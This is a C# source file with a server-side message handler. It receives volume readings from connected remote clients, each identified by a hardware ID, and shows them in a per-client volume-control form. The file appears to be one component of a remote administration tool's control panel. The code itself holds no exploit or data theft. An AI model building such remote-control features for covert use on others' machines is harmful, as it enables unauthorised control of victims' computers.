using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerVolume
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (!(text == "Connect"))
		{
			if (!(text == "Volume"))
			{
				return;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormVolumeControl form = (FormVolumeControl)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.trackBar1.Value = (int)objects[2];
			});
			return;
		}
		FormVolumeControl form2 = (FormVolumeControl)Application.OpenForms["Volume:" + (string)objects[2]];
		if (form2 == null)
		{
			client.Disconnect();
			return;
		}
		form2.Invoke((MethodInvoker)delegate
		{
			form2.Text = "Volume [" + (string)objects[2] + "]";
			form2.client = client;
			form2.trackBar1.Enabled = true;
			form2.trackBar1.Value = (int)objects[3];
		});
		client.Tag = form2;
		client.Hwid = (string)objects[2];
	}
}
